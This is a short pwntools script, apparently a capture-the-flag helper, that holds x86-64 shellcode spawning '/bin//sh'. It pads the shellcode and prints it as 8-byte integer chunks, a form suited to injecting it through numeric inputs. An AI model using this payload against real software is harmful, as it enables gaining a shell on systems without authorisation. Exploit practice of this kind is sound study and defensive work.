from pwn import *

# Example: Generate shellcode
shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"  # Or replace with your raw shellcode as bytes

# Pad shellcode to be a multiple of 8 bytes
if len(shellcode) % 8 != 0:
    shellcode = shellcode.ljust((len(shellcode) + 7) // 8 * 8, b'\x00')

# Split shellcode into 8-byte chunks and convert to integers
chunks = [u64(shellcode[i:i + 8]) for i in range(0, len(shellcode), 8)]

# Print the chunks as unsigned long long integers
for i, chunk in enumerate(chunks):
    print(f"Chunk {i}: {chunk}")
